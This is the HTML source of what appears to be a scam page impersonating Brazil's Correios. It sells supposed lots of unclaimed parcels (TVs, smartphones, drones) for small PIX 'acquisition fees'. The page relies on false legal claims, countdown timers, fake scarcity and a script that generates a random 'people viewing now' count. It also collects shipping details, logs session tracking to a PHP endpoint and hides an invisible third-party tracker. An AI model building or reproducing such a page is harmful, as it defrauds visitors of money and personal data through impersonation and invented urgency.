<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#004169">
    <meta name="description" content="Programa de Lotes - Correios">

    <title>Programa de Lotes - Correios</title>

    <link rel="icon" href="images/lau6rRAszLZQ.png" sizes="32x32">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="css/imp-a2e4f5.css">
    <link rel="stylesheet" href="css/imp-b3c9d1.css">
    <link rel="stylesheet" href="css/imp-c8e1f2.css">
    <noscript><style>body{visibility:visible!important}</style></noscript>
</head>
<body>
    <header class="header">
        <nav class="header-nav" id="headerNav">
            <a href="#" class="logo-link">
                <img src="images/correios.webp" alt="Correios" class="logo-correios">
            </a>
            <a href="#" class="btn-entrar">
                <img src="images/entrar.svg" alt="Entrar" class="icon-entrar">
                <span class="user-name">Entrar</span>
            </a>
        </nav>
    </header>

    <main class="main">
        <!-- TELA 1: PROGRAMA DE LOTES -->
        <div class="screen" id="screen1">
            <div class="card main-card">
                <div class="status-header">
                    <div class="status-row success">
                        <i class="fas fa-check-circle"></i>
                        <span>Encomenda regularizada com sucesso</span>
                    </div>
                </div>

                <div class="alerta-exclusivo">
                    <div class="alerta-icon">
                        <i class="fas fa-gift"></i>
                    </div>
                    <div class="alerta-content">
                        <h3>Parabéns! Você desbloqueou um benefício exclusivo</h3>
                        <p>Como cliente que regularizou sua encomenda, você tem acesso ao <strong>Programa de Lotes de Encomendas Não Retiradas</strong>.</p>
                    </div>
                </div>

                <div class="explicacao-box">
                    <div class="explicacao-icon">
                        <i class="fas fa-info-circle"></i>
                    </div>
                    <div class="explicacao-content">
                        <h4>O que são esses lotes?</h4>
                        <p>Conforme <strong>Decreto nº 6.538/2008</strong>, encomendas não retiradas após 90 dias são destinadas a leilão. Os Correios disponibilizam esses lotes a preços simbólicos para clientes selecionados.</p>
                    </div>
                </div>

                <div class="timer-oferta">
                    <div class="timer-icon-wrapper">
                        <i class="fas fa-clock"></i>
                    </div>
                    <div class="timer-info">
                        <span class="timer-label">Oferta exclusiva expira em:</span>
                        <span class="timer-valor" id="timerOferta">10:00</span>
                    </div>
                    <div class="timer-progress">
                        <div class="timer-progress-bar" id="timerOfertaBar"></div>
                    </div>
                </div>

                <div class="disponibilidade-info">
                    <i class="fas fa-box-open"></i>
                    <span><strong>3 lotes</strong> disponíveis para seu CPF</span>
                </div>
            </div>

            <div class="lotes-section">
                <h2 class="lotes-titulo">
                    <i class="fas fa-boxes-stacked"></i>
                    Escolha seu lote
                </h2>

                <div class="lotes-social-proof">
                    <div class="social-viewers">
                        <span class="social-dot"></span>
                        <span><strong id="viewersCount">47</strong> pessoas visualizando agora</span>
                    </div>
                </div>

                <div class="lotes-container">
                    <!-- LOTE 1 -->
                    <div class="lote-card" data-lote="1">
                        <div class="lote-tag popular">Mais escolhido</div>
                        <div class="lote-image">
                            <img src="images/lote1.webp" alt="Lote Eletrônicos" onerror="this.parentElement.style.display='none'">
                        </div>
                        <div class="lote-header">
                            <div class="lote-icon">
                                <i class="fas fa-laptop"></i>
                            </div>
                            <div class="lote-titulo">
                                <h3>Lote Eletrônicos</h3>
                                <span class="lote-codigo">Lote #ECT-3700</span>
                            </div>
                        </div>
                        <div class="lote-itens">
                            <div class="item"><i class="fas fa-check"></i><span>1x Smart TV 55" (Samsung/LG)</span></div>
                            <div class="item"><i class="fas fa-check"></i><span>1x Console de Videogame</span></div>
                            <div class="item"><i class="fas fa-check"></i><span>1x Aspirador Robô</span></div>
                            <div class="item bonus"><i class="fas fa-plus"></i><span>+ Itens diversos do lote</span></div>
                        </div>
                        <div class="lote-footer">
                            <div class="lote-preco">
                                <span class="preco-original"><del>R$ 489,00</del></span>
                                <span class="preco-label">Taxa de aquisição:</span>
                                <span class="preco-valor">R$ 37,00</span>
                                <span class="preco-economia">Economia de 92%</span>
                            </div>
                            <button class="btn-lote" onclick="selecionarLote(1, 3700, 'Lote Eletrônicos #ECT-3700')">
                                <span>Quero este lote</span>
                                <i class="fas fa-arrow-right"></i>
                            </button>
                        </div>
                        <div class="lote-estoque"><i class="fas fa-exclamation-circle"></i> Restam apenas <strong>3</strong> unidades</div>
                        <div class="lote-garantias">
                            <span><i class="fas fa-truck"></i> Frete grátis</span>
                            <span><i class="fas fa-shield-check"></i> Garantia 7 dias</span>
                        </div>
                    </div>

                    <!-- LOTE 2 -->
                    <div class="lote-card featured" data-lote="2">
                        <div class="lote-tag premium">Melhor valor</div>
                        <div class="lote-image premium">
                            <img src="images/lote2.webp" alt="Lote Premium" onerror="this.parentElement.style.display='none'">
                        </div>
                        <div class="lote-header">
                            <div class="lote-icon premium">
                                <i class="fas fa-mobile-screen"></i>
                            </div>
                            <div class="lote-titulo">
                                <h3>Lote Premium</h3>
                                <span class="lote-codigo">Lote #ECT-4700</span>
                            </div>
                        </div>
                        <div class="lote-itens">
                            <div class="item"><i class="fas fa-check"></i><span>1x iPhone ou Galaxy (última geração)</span></div>
                            <div class="item"><i class="fas fa-check"></i><span>1x Smartphone adicional</span></div>
                            <div class="item"><i class="fas fa-check"></i><span>1x Drone com câmera 4K</span></div>
                            <div class="item bonus"><i class="fas fa-plus"></i><span>+ Acessórios e itens diversos</span></div>
                        </div>
                        <div class="lote-footer">
                            <div class="lote-preco premium">
                                <span class="preco-original"><del>R$ 749,00</del></span>
                                <span class="preco-label">Taxa de aquisição:</span>
                                <span class="preco-valor">R$ 47,00</span>
                                <span class="preco-economia">Economia de 94%</span>
                            </div>
                            <button class="btn-lote premium" onclick="selecionarLote(2, 4700, 'Lote Premium #ECT-4700')">
                                <span>Quero este lote</span>
                                <i class="fas fa-arrow-right"></i>
                            </button>
                        </div>
                        <div class="lote-estoque"><i class="fas fa-exclamation-circle"></i> Restam apenas <strong>2</strong> unidades</div>
                        <div class="lote-garantias">
                            <span><i class="fas fa-truck"></i> Frete grátis</span>
                            <span><i class="fas fa-shield-check"></i> Garantia 7 dias</span>
                        </div>
                    </div>

                    <!-- LOTE 3 -->
                    <div class="lote-card" data-lote="3">
                        <div class="lote-tag economico">Premium Plus</div>
                        <div class="lote-image">
                            <img src="images/lote3.webp" alt="Lote Escritório" onerror="this.parentElement.style.display='none'">
                        </div>
                        <div class="lote-header">
                            <div class="lote-icon">
                                <i class="fas fa-couch"></i>
                            </div>
                            <div class="lote-titulo">
                                <h3>Lote Escritório</h3>
                                <span class="lote-codigo">Lote #ECT-6700</span>
                            </div>
                        </div>
                        <div class="lote-itens">
                            <div class="item"><i class="fas fa-check"></i><span>1x Cadeira Ergonômica</span></div>
                            <div class="item"><i class="fas fa-check"></i><span>1x Monitor LED 24"</span></div>
                            <div class="item"><i class="fas fa-check"></i><span>1x Kit Acessórios de Escritório</span></div>
                            <div class="item bonus"><i class="fas fa-plus"></i><span>+ Itens diversos do lote</span></div>
                        </div>
                        <div class="lote-footer">
                            <div class="lote-preco">
                                <span class="preco-original"><del>R$ 1.290,00</del></span>
                                <span class="preco-label">Taxa de aquisição:</span>
                                <span class="preco-valor">R$ 67,00</span>
                                <span class="preco-economia">Economia de 95%</span>
                            </div>
                            <button class="btn-lote" onclick="selecionarLote(3, 6700, 'Lote Escritório #ECT-6700')">
                                <span>Quero este lote</span>
                                <i class="fas fa-arrow-right"></i>
                            </button>
                        </div>
                        <div class="lote-estoque"><i class="fas fa-exclamation-circle"></i> Restam apenas <strong>1</strong> unidade</div>
                        <div class="lote-garantias">
                            <span><i class="fas fa-truck"></i> Frete grátis</span>
                            <span><i class="fas fa-shield-check"></i> Garantia 7 dias</span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="info-section">
                <div class="info-card">
                    <i class="fas fa-file-contract"></i>
                    <div>
                        <strong>Base Legal</strong>
                        <p>Decreto nº 6.538/2008 regulamenta a destinação de objetos postais não entregues.</p>
                    </div>
                </div>
                <div class="info-card">
                    <i class="fas fa-shipping-fast"></i>
                    <div>
                        <strong>Envio Imediato</strong>
                        <p>Seu lote será despachado em até 48 horas após a confirmação do pagamento.</p>
                    </div>
                </div>
            </div>

            <div class="recusar-container">
            </div>
        </div>

        <!-- TELA 2: PAGAMENTO PIX -->
        <div class="screen" id="screen2" style="display: none;">
            <div class="pagamento-wrapper">
                <div class="checkout-etapas">
                    <div class="checkout-etapa-item active" id="indicadorEtapa1">
                        <div class="checkout-etapa-badge">1</div>
                        <div class="checkout-etapa-texto">
                            <strong>Etapa 1</strong>
                            <span>Dados de envio</span>
                        </div>
                    </div>
                    <div class="checkout-etapa-separador">
                        <i class="fas fa-chevron-right"></i>
                    </div>
                    <div class="checkout-etapa-item" id="indicadorEtapa2">
                        <div class="checkout-etapa-badge">2</div>
                        <div class="checkout-etapa-texto">
                            <strong>Etapa 2</strong>
                            <span>Pagamento PIX</span>
                        </div>
                    </div>
                </div>

                <div class="checkout-step1-card" id="checkoutStep1" data-ldg-inline-root style="display: none;">
                    <h3 class="ldg-title" data-ldg-title>Dados para envio</h3>
                    <p class="ldg-subtitle" data-ldg-subtitle>Precisamos confirmar seus dados para reserva e entrega do lote.</p>
                    <form class="ldg-form" data-ldg-form novalidate></form>
                </div>

                <div class="checkout-step2" id="checkoutStep2" style="display: none;">
                    <div class="pagamento-loading" id="pagamentoLoading">
                        <div class="loading-content">
                            <div class="loading-icon-wrapper">
                                <div class="spinner-ring"></div>
                                <div class="loading-icon"><i class="fas fa-box"></i></div>
                            </div>
                            <h3>Reservando seu lote</h3>
                            <p>Aguarde enquanto geramos o código PIX...</p>
                            <div class="loading-bar"><div class="loading-bar-fill"></div></div>
                        </div>
                    </div>

                    <div class="pagamento-erro" id="pagamentoErro" style="display: none;">
                        <div class="erro-content">
                            <div class="erro-icon"><i class="fas fa-exclamation-triangle"></i></div>
                            <h3>Não foi possível reservar o lote</h3>
                            <p id="erroMensagem">Ocorreu um erro ao processar sua solicitação.</p>
                            <button class="btn-primary" onclick="gerarPixLote()">
                                <i class="fas fa-redo"></i><span>Tentar Novamente</span>
                            </button>
                            <button class="btn-secondary" onclick="voltarLotes()">
                                <i class="fas fa-arrow-left"></i><span>Escolher outro lote</span>
                            </button>
                        </div>
                    </div>

                    <div class="pagamento-conteudo" id="pagamentoConteudo" style="display: none;">
                        <div class="pagamento-header">
                            <div class="header-titulo">
                                <i class="fas fa-box-open"></i>
                                <div>
                                    <h2 id="loteTitulo">Lote Selecionado</h2>
                                    <p>Programa de Lotes - Correios</p>
                                </div>
                            </div>
                            <div class="header-valor">
                                <span class="valor-label">Taxa de aquisição</span>
                                <span class="valor-numero" id="valorPagar">R$ 0,00</span>
                            </div>
                        </div>

                        <div class="frete-badge">
                            <i class="fas fa-truck"></i>
                            <span>Frete Grátis &bull; Envio em até 48h</span>
                        </div>

                        <div class="timer-banner">
                            <div class="timer-icon pulsing"><i class="fas fa-clock"></i></div>
                            <div class="timer-info">
                                <span class="timer-label">PIX válido por:</span>
                                <span class="timer-valor" id="timerExpiracao">15:00</span>
                            </div>
                            <div class="timer-progress">
                                <div class="timer-progress-bar" id="timerProgressBar"></div>
                            </div>
                        </div>

                        <div class="pix-container">
                            <div class="pix-title">
                                <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" alt="PIX" class="pix-logo">
                                <span>Pague com PIX</span>
                            </div>
                            <div class="qrcode-area">
                                <div class="qrcode-frame">
                                    <img src="" alt="QR Code PIX" id="qrcodeImg" class="qrcode-img">
                                </div>
                                <p class="qrcode-seguranca"><i class="fas fa-shield-check"></i> Pagamento processado pelo Banco Central do Brasil</p>
                                <p class="qrcode-hint">Aponte a câmera do seu celular</p>
                            </div>
                            <div class="divisor"><span>ou copie o código</span></div>
                            <div class="copiacola-area">
                                <div class="copiacola-input-wrapper">
                                    <input type="text" id="pixCode" readonly class="copiacola-input" placeholder="Código PIX">
                                </div>
                                <button class="btn-copiar" id="btnCopiar" onclick="copiarCodigo()">
                                    <i class="fas fa-copy"></i><span>Copiar código</span>
                                </button>
                            </div>
                        </div>

                        <div class="status-area">
                            <div class="status-aguardando" id="statusAguardando">
                                <div class="status-icon pulsing"><i class="fas fa-spinner fa-pulse"></i></div>
                                <div class="status-text">
                                    <strong>Aguardando pagamento</strong>
                                    <span>O sistema atualizará automaticamente</span>
                                </div>
                            </div>
                            <div class="status-pago" id="statusPago" style="display: none;">
                                <div class="status-icon success"><i class="fas fa-check"></i></div>
                                <div class="status-text">
                                    <strong>Pagamento confirmado!</strong>
                                    <span>Seu lote será enviado em breve...</span>
                                </div>
                            </div>
                            <p class="status-info-liberacao">Após confirmação, o comprovante será enviado para o e-mail e telefone cadastrados.</p>
                        </div>

                        <div class="instrucoes-area">
                            <h4><i class="fas fa-mobile-alt"></i> Como pagar com PIX</h4>
                            <div class="instrucoes-steps">
                                <div class="step-item">
                                    <div class="step-icon"><i class="fas fa-university"></i></div>
                                    <div class="step-content"><span class="step-numero">1</span><p>Abra o <strong>app do seu banco</strong></p></div>
                                </div>
                                <div class="step-connector"><i class="fas fa-chevron-right"></i></div>
                                <div class="step-item">
                                    <div class="step-icon"><img src="https://logospng.org/download/pix/logo-pix-icone-512.png" alt="PIX" class="step-pix-icon"></div>
                                    <div class="step-content"><span class="step-numero">2</span><p>Selecione <strong>PIX Copia e Cola</strong></p></div>
                                </div>
                                <div class="step-connector"><i class="fas fa-chevron-right"></i></div>
                                <div class="step-item">
                                    <div class="step-icon"><i class="fas fa-qrcode"></i></div>
                                    <div class="step-content"><span class="step-numero">3</span><p><strong>Escaneie</strong> ou <strong>cole</strong> o código</p></div>
                                </div>
                                <div class="step-connector"><i class="fas fa-chevron-right"></i></div>
                                <div class="step-item highlight">
                                    <div class="step-icon success"><i class="fas fa-check"></i></div>
                                    <div class="step-content"><span class="step-numero">4</span><p><strong>Pronto!</strong> Confirmação automática</p></div>
                                </div>
                            </div>
                        </div>

                        <div class="seguranca-area">
                            <div class="seguranca-item"><i class="fas fa-lock"></i><span>Pagamento seguro</span></div>
                            <div class="seguranca-item"><i class="fas fa-shield-check"></i><span>Garantia 7 dias</span></div>
                        </div>

                        <div class="voltar-container">
                            <button class="btn-voltar" onclick="voltarLotes()">
                                <i class="fas fa-arrow-left"></i><span>Escolher outro lote</span>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer class="footer">
        <div class="footer-container">
            <div class="footer-links">
                <div class="footer-section">
                    <h4>Fale Conosco</h4>
                    <ul>
                        <li><i class="fas fa-desktop"></i> Registro de Manifestações</li>
                        <li><i class="fas fa-circle-question"></i> Central de Atendimento</li>
                        <li><i class="fas fa-briefcase"></i> Soluções para o seu negócio</li>
                        <li><i class="fas fa-headset"></i> Suporte ao cliente com contrato</li>
                        <li><i class="fas fa-comment-dots"></i> Ouvidoria</li>
                        <li><i class="fas fa-headset"></i> Denúncia</li>
                    </ul>
                </div>
                <div class="footer-section">
                    <h4>Sobre os Correios</h4>
                    <ul>
                        <li><i class="fas fa-address-card"></i> Identidade corporativa</li>
                        <li><i class="fas fa-user-graduate"></i> Educação e cultura</li>
                        <li><i class="fas fa-book"></i> Código de ética</li>
                        <li><i class="fas fa-comment-dots"></i> Política de privacidade e Notas legais</li>
                    </ul>
                </div>
                <div class="footer-section">
                    <h4>Outros Sites</h4>
                    <ul>
                        <li><i class="fas fa-cart-shopping"></i> Loja online dos correios</li>
                    </ul>
                </div>
            </div>
            <div class="footer-bottom">
                <div class="footer-logos">
                    <img src="images/logo-rodape.webp" alt="Correios e Receita Federal" class="logo-footer">
                </div>
                <p class="footer-copyright">&copy; Copyright 2026 Correios<br>CNPJ 34.028.316/0001-03</p>
            </div>
        </div>
    </footer>

    <script src="js/imp-t4k2r1.js"></script>
<script>window._currentStep="lote";window._trackEvent("page_view","lote");setTimeout(function(){if(window._dsid){fetch("api/save-tracking.php",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({session_id:window._dsid,event:"heartbeat",step:"lote"}),keepalive:true}).catch(function(){});}},500);</script>
<script src="js/shield.js"></script>
    <script src="js/imp-b3c9d1a.js"></script>
    <script src="js/imp-a2e4f5a.js"></script>

<script>
(function(){
    var el = document.getElementById('viewersCount');
    if (!el) return;
    var base = 38 + Math.floor(Math.random() * 20);
    el.textContent = base;
    setInterval(function(){
        base += Math.random() > 0.5 ? 1 : -1;
        if (base < 32) base = 33;
        if (base > 64) base = 62;
        el.textContent = base;
    }, 3000 + Math.floor(Math.random() * 4000));
})();
</script>

<div style="position:absolute; width:1px; height:1px; overflow:hidden; opacity:0; pointer-events:none; left:-9999px;">
  <script id="_waum87">var _wau = _wau || []; _wau.push(["dynamic", "00lylhhgew", "m87", "c4302bffffff", "small"]);</script>
  <script async src="//waust.at/d.js"></script>
</div>

</body>
</html>
